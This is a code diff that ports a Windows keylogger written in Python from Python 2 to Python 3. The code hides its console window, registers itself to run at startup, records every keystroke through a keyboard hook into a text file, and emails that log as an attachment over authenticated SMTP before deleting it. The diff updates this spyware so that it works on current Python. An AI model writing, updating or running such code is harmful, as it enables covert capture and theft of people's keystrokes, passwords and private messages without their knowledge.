@@ -1,14 +1,15 @@
 import win32api
 import win32console
 import win32gui
-import pythoncom,pyHook
+import pythoncom
+import pyHook
 import smtplib
 import base64, os, sys, re, string
 import sqlite3
 import socket
 import platform
 import uuid
-from _winreg import *
+from winreg import *
 def addStartup():  # this will add the file to the startup registry key
     fp = os.path.dirname(os.path.realpath(__file__))
     file_name = sys.argv[0].split('\\')[-1]
@@ -28,15 +29,15 @@ win=win32console.GetConsoleWindow()
 win32gui.ShowWindow(win,0)
 #create text file
 with open('output.txt','w+') as f:
-    print ""
+    print("")
 f.close
-print "Running..."
+print("Running...")
 points = 0
 def OnKeyboardEvent(event):
     #Ctrl-E
     global points
     points += 1
-    print points
+    print(points)
     if event.Ascii==5:
         f=open('output.txt','r+')
         f.close()
@@ -107,13 +108,13 @@ Content-Disposition: attachment; filename=%s
            smtpObj.starttls()
            smtpObj.login(sender, password)
            smtpObj.sendmail(sender, reciever, message)
-           print "Success"
+           print("Success")
            os.remove("output.txt")
            f = open('output.txt','w+')
            f.close()
         except Exception as e:
-           print "Error: "
-           print e
+           print("Error: ")
+           print(e)
 
 hm=pyHook.HookManager()
 hm.KeyDown=OnKeyboardEvent
